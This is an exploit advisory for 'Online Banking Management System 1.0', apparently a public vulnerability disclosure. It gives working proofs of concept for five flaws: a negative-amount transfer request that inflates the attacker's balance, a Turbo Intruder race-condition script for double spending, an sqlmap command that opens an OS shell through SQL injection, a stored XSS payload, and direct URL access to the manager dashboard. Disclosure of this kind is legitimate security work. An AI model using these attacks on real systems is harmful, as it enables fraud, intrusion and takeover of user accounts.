# Exploit Title: Online Banking Management System 1.0 - Multiple Vulnerabilities (RCE, Logic Flaw, IDOR, Race Condition)
# Date: 2025-12-21
# Exploit Author: Syntropy Security (Sankalp Devidas Hanwate)
# Vendor Homepage: https://www.sourcecodester.com/php/15373/online-banking-management-system-php-free-source-code.html
# Software Link: https://www.sourcecodester.com/download-code?nid=15373&title=Online+Banking+Management+System+in+PHP+Free+Source+Code
# Version: 1.0
# Tested on: Kali Linux / Debian 11 / Apache / MySQL
# CVE : N/A (Submitted)

Description:
The Online Banking Management System v1.0 suffers from five (5) critical vulnerabilities allowing for unauthenticated Remote Code Execution (RCE), Business Logic Bypass (Infinite Money), Race Conditions (Double Spending), and Broken Access Control (IDOR).

================================================================================
[1] Business Logic Flaw (Infinite Money)
================================================================================
The application fails to validate signed integers in the transfer amount.

Vulnerable Parameter: amount
Endpoint: /bank/transfer.php

PoC Request:
POST /bank/transfer.php HTTP/1.1
Host: localhost
Cookie: PHPSESSID=[AttackerSession]
Content-Type: application/x-www-form-urlencoded

otherNo=[VictimAccount]&amount=-5000&transferSelf=

Result: The attacker's balance INCREASES by 5000.

================================================================================
[2] Race Condition (Double Spend)
================================================================================
The transfer logic lacks atomic transactions. Sending simultaneous requests allows spending the same funds multiple times.

Vulnerable Endpoint: /bank/transfer.php

Turbo Intruder Script (Python):
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100, pipeline=False)
    victims = ['1005469', '1005477'] # Target Accounts
    for victim in victims:
        engine.queue(target.req, victim, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)

================================================================================
[3] Remote Code Execution (Authenticated SQL Injection)
================================================================================
The 'otherNo' parameter is vulnerable to SQL Injection. If the DB user has FILE privileges, this leads to RCE.

Vulnerable Parameter: otherNo
Endpoint: /bank/transfer.php

SQLMap Command:
sqlmap -u "http://localhost/bank/transfer.php" --cookie="PHPSESSID=[Cookie]" --data="otherNo=1*&amount=100&transferSelf=" --os-shell

================================================================================
[4] Stored Cross-Site Scripting (XSS)
================================================================================
The Feedback module allows raw HTML/JS injection. Requires character escaping to bypass SQL syntax errors.

Vulnerable Parameter: message
Endpoint: /bank/feedback.php

Payload:
<script>alert(\'Admin Taken Over\')</script>

================================================================================
[5] Broken Access Control (IDOR / Manager Bypass)
================================================================================
Low privilege users can access the Manager Dashboard by forcibly browsing to administrative files. Access control is enforced only by hiding the URL, not by server-side session checks.

Vulnerable Endpoints:
- /bank/mindex.php (Manager Dashboard)
- /bank/maccounts.php (Staff Accounts)

PoC:
1. Log in as a standard user (Attacker).
2. Navigate directly to: http://localhost/bank/mindex.php
3. The server returns the full Manager Dashboard, allowing the attacker to delete users via ?delete=[id] parameters.